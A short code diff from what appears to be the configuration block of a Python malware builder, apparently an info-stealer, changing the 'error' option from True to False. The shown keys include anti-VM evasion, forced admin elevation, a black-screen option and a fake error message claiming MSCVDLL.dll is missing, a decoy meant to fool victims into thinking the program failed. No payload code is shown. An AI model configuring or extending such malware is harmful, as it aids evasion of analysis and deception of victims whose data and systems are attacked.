@@ -25,7 +25,7 @@ config = {
     'antivm': True,
     'force_admin': False,
     'black_screen': False,
-    'error': True,
+    'error': False,
     'error_message': 'This application failed to start because MSCVDLL.dll is missing.\n\nPlease download the latest version of Microsoft C++ Compiler and try again.',
 }
 class functions(object):
